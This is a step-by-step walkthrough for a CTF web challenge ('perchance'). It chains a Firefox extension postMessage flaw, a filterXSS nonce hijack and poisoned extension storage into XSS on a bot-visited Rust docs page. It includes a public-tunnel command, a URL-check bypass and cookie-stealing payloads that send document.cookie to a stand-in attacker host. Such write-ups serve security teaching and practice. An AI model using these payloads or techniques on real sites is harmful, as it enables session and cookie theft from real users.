# How to get the flag â€” step by step

## What you need
- 3 terminal tabs
- A challenge instance URL (get a fresh one from the CTF platform)
- The exploit files in `/mnt/c/users/santey/desktop/NNS CTF/perchance/exploit/`

---

## Step 1 â€” Get a public tunnel (Terminal 3)

```bash
ssh -R 80:localhost:8080 nokey@localhost.run
```

Wait for the line that says something like:
```
https://2e0caf80a95f05.lhr.life tunneled with tls termination
```

**Copy that URL.** That is your `ATTACKER_URL`. Keep this terminal open â€” do not close it.

---

## Step 2 â€” Start the exploit server (Terminal 1)

```bash
cd /mnt/c/users/santey/desktop/NNS\ CTF/perchance/exploit
python server.py https://2e0caf80a95f05.lhr.life
```

Replace `https://2e0caf80a95f05.lhr.life` with whatever URL you got in Step 1.

You should see:
```
[*] Exploit server listening on 0.0.0.0:8080
[*] Attacker origin: https://2e0caf80a95f05.lhr.life
```

Keep this terminal open and watch it â€” the flag will appear here.

---

## Step 3 â€” Update the challenge instance URL (if needed)

If you got a new instance URL from the CTF platform (e.g. `https://perchance-XXXX.chall.nnsc.tf`), open `submit.py` and change line:

```python
CHALLENGE_URL = "https://perchance-8521109216a8.chall.nnsc.tf/perchance"
```

to your new instance.

---

## Step 4 â€” Submit the exploit (Terminal 2)

```bash
cd /mnt/c/users/santey/desktop/NNS\ CTF/perchance/exploit
python submit.py https://2e0caf80a95f05.lhr.life
```

Again, replace the URL with yours from Step 1.

The script submits **only Phase 1**. Everything â€” poisoning storage AND navigating to `doc.rust-lang.org` â€” happens inside **a single bot session**. Do NOT submit a second URL â€” that creates a new browser with clean storage and Phase 2 will always fail.

---

## Step 5 â€” Wait for the flag

Watch **Terminal 1** (server.py). You should see beacons in this order, then the flag:

```
[BEACON] [phase1] Phase 1 loaded
[BEACON] [phase1] window.open called: success
[BEACON] [phase1] postMessage sent to popup
[BEACON] [trigger] Trigger loaded
[BEACON] [trigger] MutationObserver attached
[BEACON] [trigger] Found module script node: ...
[BEACON] [trigger] Extracted nonce: a08879...
[BEACON] [trigger] Nonce getter invoked!
[BEACON] [trigger] fakeFilterXSS called with: https://TUNNEL/trigger?...
[BEACON] [trigger] After wait loop, poisoned=true
[BEACON] [trigger] Reset sent to iframe
[BEACON] [trigger] Reset sent to popup
[BEACON] [trigger] Navigating to target doc.rust-lang.org/stable/std/
[BEACON] [xss] XSS_FIRED_cookie=flag=NNS{...}      <- XSS fired on real Rust docs!

============================================================
[!!!] FLAG RECEIVED!
      flag=NNS{...}
============================================================
```

It also gets saved to `exploit/flag.txt`.

---

## If it doesn't work â€” Lessons Learned (hard way)

### âŒ WRONG: Submitting two separate URLs (Phase 1 + Phase 2)

Each call to the bot creates a **completely new browser and extension context**. Extension storage (`previous`) is **not persisted** between sessions. Submitting Phase 2 separately always fails because the poisoned `previous` is gone.

**Fix:** Submit only Phase 1. The trigger page navigates to `doc.rust-lang.org/stable/std/` itself at the end.

### âš ï¸ Timing: async storage write must complete before navigation

`cs.js` calls `browser.runtime.sendMessage({updateLastUrl})` which is async. `background.js` receives it and does `await browser.storage.local.set({previous: payload})`. This storage write must complete **before** navigating to `doc.rust-lang.org`.

**Fix:** Wait at least **5 seconds** after `fakeFilterXSS` is confirmed called (after `poisoned=true`) before sending the reset and navigating. The current `server.py` uses `await sleep(5000)` then `await sleep(2000)` for this.

### âš ï¸ XSS payload: use `Image()` not `fetch()`

`fetch()` inside `onerror` attributes may behave differently depending on browser sandbox constraints. `new Image().src` is the most reliable cross-origin exfiltration method in XSS.

**Payload template:**
```html
<img src=x onerror="new Image().src='https://ATTACKER/steal?c='+encodeURIComponent(document.cookie)">
```

### âš ï¸ Add a beacon INSIDE the XSS payload

To know if Phase 2 (XSS on `doc.rust-lang.org`) actually fires, put a beacon call before the steal:
```html
<img src=x onerror="
  new Image().src='https://ATTACKER/beacon?step=xss&msg=XSS_FIRED_cookie%3D'+encodeURIComponent(document.cookie);
  new Image().src='https://ATTACKER/steal?c='+encodeURIComponent(document.cookie);
">
```
If you see `[BEACON] [xss]` but no `/steal` hit, the exfil method has an issue. If you see neither, the XSS isn't firing on `doc.rust-lang.org` at all.

### âš ï¸ Reset `activateOn` BEFORE navigating

`options.js` validates `url.href.includes('https://doc.rust-lang.org/')` and sets `activateOn = u.origin`. You must reset it (send `'https://doc.rust-lang.org/'` postMessage to options page) and give it time to process **before** navigating to `doc.rust-lang.org`, otherwise `background.js` `onCompleted` won't match `url.startsWith('https://doc.rust-lang.org/')`.

### Debugging checklist

```
GET /            <- bot hit Phase 1 âœ“
GET /trigger     <- bot redirected to trigger âœ“
[BEACON] fakeFilterXSS called   <- nonce intercepted, payload created âœ“
[BEACON] After wait loop, poisoned=true  <- storage write pending âœ“
[BEACON] Reset sent   <- activateOn reset âœ“
[BEACON] Navigating   <- bot going to doc.rust-lang.org âœ“
[BEACON] [xss] XSS_FIRED   <- XSS fired on real Rust docs! âœ“
GET /steal?c=   <- FLAG âœ“
```

If you only see `GET /favicon.ico` or nothing â†’ tunnel blocked the bot. Restart tunnel (Step 1).

If you see everything through `Navigating` but no `[xss]` beacon â†’ XSS didn't fire on `doc.rust-lang.org`. Possible causes: `previous` wasn't written yet (increase sleep), `activateOn` wasn't reset in time.

If the bot returns `{"ok": false, "error": "Browser is in use"}` â†’ wait ~45s and retry.

---

## Summary of the attack (what's actually happening)

1. You submit `https://doc.rust-lang.org@TUNNEL/` â€” passes the server's URL check but the browser actually goes to your tunnel server
2. Your page opens the Firefox extension's options page and sends it a `postMessage` â†’ changes `activateOn` to your domain
3. Your page redirects to `/trigger?https://doc.rust-lang.org/` â†’ the extension now injects `cs.js` into your trigger page (matches `startsWith(activateOn)` AND `includes('https://doc.rust-lang.org/')`)
4. Your trigger page uses `MutationObserver` to intercept the random nonce `cs.js` uses to call `filterXSS`, defines `window[nonce]` as a getter returning `fakeFilterXSS`
5. `cs.js` calls `fakeFilterXSS(location.href)` â†’ returns XSS payload â†’ sends it as `lastPage` via `updateLastUrl` message â†’ `background.js` stores it as `previous` in extension storage
6. Trigger page waits 5s for storage write, then resets `activateOn` to `'https://doc.rust-lang.org/'` and navigates to `https://doc.rust-lang.org/stable/std/`
7. Extension injects `cs.js` into the real Rust docs page (same bot session, storage intact) â†’ `cs.js` reads the poisoned `previous`, sets `elm.innerHTML = \`Previous: ${prev}\`` â†’ XSS fires
8. XSS reads `document.cookie` (flag is there â€” cookie is `httpOnly=false`, `sameSite=Strict`, `path=/stable/std/`) â†’ sends it to your `/steal` endpoint
